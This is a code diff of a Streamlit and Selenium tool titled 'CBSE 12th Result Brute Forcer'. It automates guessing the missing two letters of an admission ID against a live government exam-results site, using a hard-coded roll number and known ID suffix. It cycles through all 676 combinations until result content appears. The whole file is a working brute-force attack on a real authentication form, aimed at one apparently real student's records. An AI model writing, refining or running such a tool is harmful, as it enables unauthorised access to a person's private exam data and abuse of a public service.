@@ -1,15 +1,16 @@
 import streamlit as st
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import NoSuchElementException, TimeoutException
+from selenium.common.exceptions import NoSuchElementException
 import time
 import string
 
 # ========================= CONFIGURATION =========================
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
-DELAY = 4.0
+
+FIELD1_VALUE = "18615900"
+KNOWN_LAST_6 = "004511"
+DELAY_BETWEEN_ATTEMPTS = 3.0
 # ============================================================
 
 def get_driver():
@@ -22,39 +23,42 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    """Your original logic"""
+    """EXACT same function as your local code"""
     try:
-        # Check error message
+        # Look for error message
         try:
             error_elem = driver.find_element(By.ID, "err_msg")
             if error_elem.is_displayed() and error_elem.text.strip():
                 return False
         except NoSuchElementException:
-            pass
+            pass  # No error element = good sign
         
-        # Success indicators
+        # Alternative success checks
         try:
-            success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
+            success_indicators = ["marks", "result", "subject", "grade", "total"]
             page_text = driver.page_source.lower()
             if any(ind in page_text for ind in success_indicators):
                 return True
         except:
             pass
             
+        # URL changed
         if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
             return True
-    except:
+            
+    except Exception:
         pass
-    return False
+    
+    return False  # Default: assume failed
 
 
-# ====================== UI ======================
+# ====================== STREAMLIT UI ======================
 st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
 st.title("🔍 CBSE 12th Result Brute Forcer")
 
-roll_number = st.text_input("Roll Number", value="18615900")
-known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 3.0, 8.0, DELAY, 0.5)
+roll_number = st.text_input("Roll Number", value=FIELD1_VALUE)
+known_last_6 = st.text_input("Known Last 6 Characters", value=KNOWN_LAST_6, max_chars=6)
+delay = st.slider("Delay between attempts (seconds)", 2.0, 6.0, DELAY_BETWEEN_ATTEMPTS, 0.5)
 
 if st.button("🚀 Start Brute Force", type="primary"):
     if len(known_last_6) != 6:
@@ -68,11 +72,6 @@ if st.button("🚀 Start Brute Force", type="primary"):
         try:
             driver = get_driver()
             driver.get(URL)
-            
-            # Wait for page to fully load
-            WebDriverWait(driver, 15).until(
-                EC.presence_of_element_located((By.TAG_NAME, "body"))
-            )
             status.success("✅ Page loaded. Starting brute force...")
 
             letters = string.ascii_uppercase
@@ -87,42 +86,34 @@ if st.button("🚀 Start Brute Force", type="primary"):
                     progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")
 
                     try:
-                        # Wait for fields to appear
-                        WebDriverWait(driver, 10).until(
-                            EC.presence_of_element_located((By.ID, "rroll"))
-                        )
-
+                        # Exact same style as your local code
                         driver.find_element(By.ID, "rroll").clear()
                         driver.find_element(By.ID, "rroll").send_keys(roll_number)
-
+                        
                         driver.find_element(By.ID, "admn_id").clear()
                         driver.find_element(By.ID, "admn_id").send_keys(code)
-
-                        # Reliable click
-                        submit_btn = WebDriverWait(driver, 10).until(
-                            EC.element_to_be_clickable((By.ID, "submit"))
-                        )
-                        submit_btn.click()
-
+                        
+                        driver.find_element(By.ID, "submit").click()
+                        
                         time.sleep(delay)
 
                         if is_success(driver):
                             result_box.success(f"""
                             SUCCESS FOUND!
 
-                            Full Code: **{code}**
-                            Prefix: **{attempt}**
+                            Full Code: {code}
+                            Prefix: {attempt}
                             """)
                             st.balloons()
                             break
-                    except Exception:
+                    except:
                         continue
 
             else:
                 st.error("❌ Finished all 676 attempts without success.")
 
         except Exception as e:
-            st.error(f"Critical Error: {str(e)}")
+            st.error(f"Error: {str(e)}")
         finally:
             if driver:
                 driver.quit()
